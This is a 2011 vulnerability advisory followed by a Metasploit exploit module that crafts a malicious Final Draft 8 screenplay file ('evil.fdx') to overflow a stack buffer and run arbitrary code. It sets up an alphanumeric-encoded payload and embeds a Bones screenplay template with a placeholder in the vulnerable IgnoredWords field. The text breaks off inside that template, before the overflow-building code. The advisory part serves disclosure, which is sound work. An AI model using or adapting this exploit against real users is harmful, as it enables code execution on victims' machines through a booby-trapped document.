#Name : Final Draft 8 Multiple Stack Buffer Overflows 
#Vendor Website : http://www.finaldraft.com/index.php 
#Date Released : 29/11/2011 
#Affected Software : Final Draft < 8.02 
#Researcher : Nick Freeman (nick.freeman@security-assessment.com)

#Description
#Security-Assessment.com has discovered several file format vulnerabilities in .fdx and .fdxt files, as used by #the script writing software, Final Draft 8.
#The following XML tag elements were found to be vulnerable to buffer overflows, which can be exploited to #execute arbitrary code under the context of the user running Final Draft 8:
#<Word> in <IgnoredWords>
#  <Transition> in <SmartType>
#  <Location> in <SmartType>
#  <Extension> in <SmartType>
#  <SceneIntro> in <SmartType>
#  <TimeOfDay> in <SmartType>
#  <Character> in <SmartType>
#By crafting a file that contains more than 10,032 characters in one of the above fields, the Final Draft 8 #application will crash as a result of a buffer overflow overwriting the SEH (Structured Exception Handler).

#Solution
#The latest version of Final Draft (version 8.02) remediates this vulnerability. This can be downloaded from #the Final Draft website.

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Final Draft 8 File Format Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in Final Draft 8. Multiple
					fields are vulnerable to the overflow, however <Word> in <IgnoredWords> is
					the only field to accept mixed-case characters.
			},
			'License'        => MSF_LICENSE,
			'Author' 	     => [ 'vt [nick.freeman@security-assessment.com]' ],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'URL', 'http://security-assessment.com/files/documents/advisory/Final_Draft-Multiple_Stack_Buffer_Overflows.pdf' ]
				],
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
					'DisableNops'    => true,
					'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'EAX',
						}
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Default',
						{
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Nov 29 2011',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'evil.fdx']),
			], self.class)
	end

	def exploit

		template = %Q|<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<FinalDraft DocumentType="Script" Template="No" Version="1">
<Content>
<Paragraph Type="Show/Ep. Title">
<Text>‘BONES’</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>Teaser</Text>
</Paragraph>
<Paragraph Number="1" Type="Scene Heading">
<SceneProperties Length="4/8" Page="1" Title=""/>
<Text>Int. Someplace perfectly normal -- day</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>An unassuming crime scene roped off with yellow crime scene tape.  Various cops and </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">Feds</Text>
<Text> pick over the spot.</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>Booth is leading Brennan to a dusty, desiccated corpse.</Text>
</Paragraph>
<Paragraph Type="Character">
<Text>Special agent Booth</Text>
</Paragraph>
<Paragraph Type="Parenthetical">
<Text>(pointing to corpse)</Text>
</Paragraph>
<Paragraph Type="Dialogue">
<Text>Right here.  No one knows what to make of it.</Text>
</Paragraph>
<Paragraph Type="Character">
<Text>Brennan </Text>
</Paragraph>
<Paragraph Type="Dialogue">
<Text>Well, that’s why I’m here.</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>The default font for this template is Courier Final Draft.  Notice that scenes are numbered at left and right margins and that the Act Breaks are in bold type.</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>More forensic banter leads us to the end of the teaser.</Text>
</Paragraph>
<Paragraph Type="End Of Act">
<Text>End of teaser</Text>
</Paragraph>
<Paragraph Type="New Act">
<Text>Act 1</Text>
</Paragraph>
<Paragraph Number="2" Type="Scene Heading">
<SceneProperties Length="4/8" Page="2" Title=""/>
<Text>Int. </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">Smithsonian</Text>
<Text> medico-legal lab -- day</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>Brennan, Zack, Hodgins and Booth are all standing around the exam table where the corpse has been laid out.</Text>
</Paragraph>
<Paragraph Type="Character">
<Text>Zack</Text>
</Paragraph>
<Paragraph Type="Dialogue">
<Text>He’s been dead for a while now.</Text>
</Paragraph>
<Paragraph Type="Character">
<Text>Dr. Jack hodgins</Text>
</Paragraph>
<Paragraph Type="Dialogue">
<Text>Your genius is terrifying.</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>Booth enters looking frustrated.</Text>
</Paragraph>
<Paragraph Type="Character">
<Text>Special agent booth</Text>
</Paragraph>
<Paragraph Type="Dialogue">
<Text>Any results yet?  I got some serious heat on me about this case.</Text>
</Paragraph>
<Paragraph Type="Character">
<Text>BRENNAN</Text>
</Paragraph>
<Paragraph Type="Dialogue">
<Text>It’s not cut and dried, Booth.  If you look at the occipital blah </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">blah</Text>
<Text> </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">blah</Text>
<Text> and the traces of silt located in the blah </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">blah</Text>
<Text> </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">blah</Text>
<Text>...</Text>
</Paragraph>
<Paragraph Type="Character">
<Text>SPECIAL AGENT BOOTH</Text>
</Paragraph>
<Paragraph Type="Dialogue">
<Text>So it’s going to take a little more time?</Text>
</Paragraph>
<Paragraph Number="3" Type="Scene Heading">
<SceneProperties Length="2/8" Page="2" Title=""/>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Bold+AllCaps">Begin musical montage: (”Some cool song” by some cool band)</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>-- “Bones” often features a montage of work or investigation set to a modern song.</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>-- The montage </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">intro</Text>
<Text> and end are designated by scene headings in boldface as seen above and below.</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>-- The scenes in the montage are entered just as pieces of action with the two dash </Text>
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">intro</Text>
<Text>.</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>-- Like this.</Text>
</Paragraph>
<Paragraph Number="4" Type="Scene Heading">
<SceneProperties Length="1/8" Page="2" Title=""/>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Bold+AllCaps">End musical montage</Text>
</Paragraph>
<Paragraph Number="5" Type="Scene Heading">
<SceneProperties Length="1/8" Page="2" Title=""/>
<Text>Int. Brennan’s co-op / brennan’s bedroom -- Night</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>Brennan enters, exhausted, collapses on bed.</Text>
</Paragraph>
<Paragraph Type="Transition">
<Text>Cut to:</Text>
</Paragraph>
<Paragraph Number="6" Type="Scene Heading">
<SceneProperties Length="3/8" Page="3" Title=""/>
<Text>Int. Medico-legal building / angela’s area -- day</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>Angela is standing at the laser imaging table and the reconstruction of the corpse’s face is just becoming visible.  She sees something amazing.</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>She picks up her cell phone and dials.</Text>
</Paragraph>
<Paragraph Type="Character">
<Text>Angela</Text>
</Paragraph>
<Paragraph Type="Parenthetical">
<Text>(into phone)</Text>
</Paragraph>
<Paragraph Type="Dialogue">
<Text>Yeah, I think you might want to come back in.</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>“Bones,” being an hour-long drama, has a teaser </Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Underline">and four acts</Text>
<Text>.</Text>
</Paragraph>
<Paragraph Type="End Of Act">
<Text>End of act one</Text>
</Paragraph>
<Paragraph Type="New Act">
<Text>Act four</Text>
</Paragraph>
<Paragraph Type="Scene Heading">
<SceneProperties Length="2/8" Page="4" Title=""/>
<Text>Int. Booth’s vehicle / traveling -- day</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>Action here.</Text>
</Paragraph>
<Paragraph Type="Character">
<Text>BRENNAN</Text>
</Paragraph>
<Paragraph Type="Dialogue">
<Text>Dialogue here.</Text>
</Paragraph>
<Paragraph Type="Action">
<Text>Mystery solved.</Text>
</Paragraph>
<Paragraph Type="End Of Act">
<Text>End show</Text>
</Paragraph>
</Content>
<HeaderAndFooter FooterFirstPage="Yes" FooterVisible="No" HeaderFirstPage="No" HeaderVisible="Yes" StartingPage="1">
<Header>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.50" RightIndent="-0.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">BONES - Ep# - </Text>
<DynamicLabel Type="Last Revised"/>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""> </Text>
<DynamicLabel Type="Page #"/>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">.</Text>
<Tabstops>
<Tabstop Position="7.50" Type="Right"/>
</Tabstops>
</Paragraph>
</Header>
<Footer>
<Paragraph Alignment="Right" FirstIndent="0.00" Leading="Regular" LeftIndent="1.25" RightIndent="-1.25" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""> </Text>
</Paragraph>
</Footer>
</HeaderAndFooter>
<SpellCheckIgnoreLists>
<IgnoredRanges/>
<IgnoredWords>
<Word>BrennanAREPLACE_1</Word>
</IgnoredWords>
</SpellCheckIgnoreLists>
<PageLayout BackgroundColor="#FFFFFFFFFFFF" BottomMargin="72" BreakDialogueAndActionAtSentences="Yes" DocumentLeading="Normal" FooterMargin="36" ForegroundColor="#000000000000" HeaderMargin="36" InvisiblesColor="#808080808080" TopMargin="72" UsesSmartQuotes="Yes">
<AutoCastList AddParentheses="Yes" AutomaticallyGenerate="No" CastListElement="Cast List"/>
</PageLayout>
<WindowState Height="635" Left="2" Mode="Normal" Top="2" Width="649"/>
<TextState Scaling="100" Selection="0,0" ShowInvisibles="No"/>
<ElementSettings Type="General">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""/>
<ParagraphSpec Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.50" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No"/>
<Behavior PaginateAs="General" ReturnKey="General" Shortcut="0"/>
</ElementSettings>
<ElementSettings Type="Scene Heading">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps"/>
<ParagraphSpec Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.50" RightIndent="7.50" SpaceBefore="11" Spacing="1" StartsNewPage="No"/>
<Behavior PaginateAs="Scene Heading" ReturnKey="Action" Shortcut="1"/>
</ElementSettings>
<ElementSettings Type="Action">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""/>
<ParagraphSpec Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.50" RightIndent="7.50" SpaceBefore="11" Spacing="1" StartsNewPage="No"/>
<Behavior PaginateAs="Action" ReturnKey="Action" Shortcut="2"/>
</ElementSettings>
<ElementSettings Type="Character">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps"/>
<ParagraphSpec Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="3.50" RightIndent="7.25" SpaceBefore="11" Spacing="1" StartsNewPage="No"/>
<Behavior PaginateAs="Character" ReturnKey="Dialogue" Shortcut="3"/>
</ElementSettings>
<ElementSettings Type="Parenthetical">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""/>
<ParagraphSpec Alignment="Left" FirstIndent="-0.10" Leading="Regular" LeftIndent="3.00" RightIndent="5.50" SpaceBefore="0" Spacing="1" StartsNewPage="No"/>
<Behavior PaginateAs="Parenthetical" ReturnKey="Dialogue" Shortcut="4"/>
</ElementSettings>
<ElementSettings Type="Dialogue">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""/>
<ParagraphSpec Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="2.50" RightIndent="6.00" SpaceBefore="0" Spacing="1" StartsNewPage="No"/>
<Behavior PaginateAs="Dialogue" ReturnKey="Action" Shortcut="5"/>
</ElementSettings>
<ElementSettings Type="Transition">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps"/>
<ParagraphSpec Alignment="Right" FirstIndent="0.00" Leading="Regular" LeftIndent="5.50" RightIndent="7.10" SpaceBefore="11" Spacing="1" StartsNewPage="No"/>
<Behavior PaginateAs="Transition" ReturnKey="Scene Heading" Shortcut="6"/>
</ElementSettings>
<ElementSettings Type="Shot">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps"/>
<ParagraphSpec Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.50" RightIndent="7.50" SpaceBefore="11" Spacing="1" StartsNewPage="No"/>
<Behavior PaginateAs="Scene Heading" ReturnKey="Action" Shortcut="7"/>
</ElementSettings>
<ElementSettings Type="Cast List">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps"/>
<ParagraphSpec Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.50" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No"/>
<Behavior PaginateAs="Action" ReturnKey="Action" Shortcut="8"/>
</ElementSettings>
<ElementSettings Type="New Act">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Bold+Underline+AllCaps"/>
<ParagraphSpec Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="Yes"/>
<Behavior PaginateAs="General" ReturnKey="Scene Heading" Shortcut=""/>
</ElementSettings>
<ElementSettings Type="End Of Act">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Bold+Underline+AllCaps"/>
<ParagraphSpec Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="22" Spacing="1" StartsNewPage="No"/>
<Behavior PaginateAs="General" ReturnKey="New Act" Shortcut="9"/>
</ElementSettings>
<ElementSettings Type="Teaser/Act One">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Bold+Underline+AllCaps"/>
<ParagraphSpec Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="22" Spacing="1" StartsNewPage="No"/>
<Behavior PaginateAs="General" ReturnKey="Scene Heading" Shortcut="F2"/>
</ElementSettings>
<ElementSettings Type="Show/Ep. Title">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Bold+Underline"/>
<ParagraphSpec Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No"/>
<Behavior PaginateAs="General" ReturnKey="Teaser/Act One" Shortcut="F1"/>
</ElementSettings>
<TitlePage>
<HeaderAndFooter FooterFirstPage="Yes" FooterVisible="No" HeaderFirstPage="No" HeaderVisible="No" StartingPage="1">
<Header>
<Paragraph Alignment="Right" FirstIndent="0.00" Leading="Regular" LeftIndent="1.25" RightIndent="-1.25" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<DynamicLabel Type="Page #"/>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">.</Text>
</Paragraph>
</Header>
<Footer>
<Paragraph Alignment="Right" FirstIndent="0.00" Leading="Regular" LeftIndent="1.25" RightIndent="-1.25" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""> </Text>
</Paragraph>
</Footer>
</HeaderAndFooter>
<Content>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="144" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="144" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Underline">Bones</Text>
</Paragraph>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="24" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">"</Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Underline">Episode Title</Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">"</Text>
</Paragraph>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="36" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="-1" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">written</Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""> by</Text>
</Paragraph>
<Paragraph Alignment="Center" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="12" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">Writer's Name </Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""></Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="AllCaps">Production company name</Text>
</Paragraph>
<Paragraph Alignment="Left" FirstIndent="0.00" Leading="Regular" LeftIndent="1.00" RightIndent="7.50" SpaceBefore="0" Spacing="1" StartsNewPage="No">
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="">Address Line 1   </Text>
<Text AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style="Underline+AllCaps">draft name</Text>
<Tabstops>
<Tabstop Position="6.00" Type="Left"/>
</Tabstops>
</Paragraph>
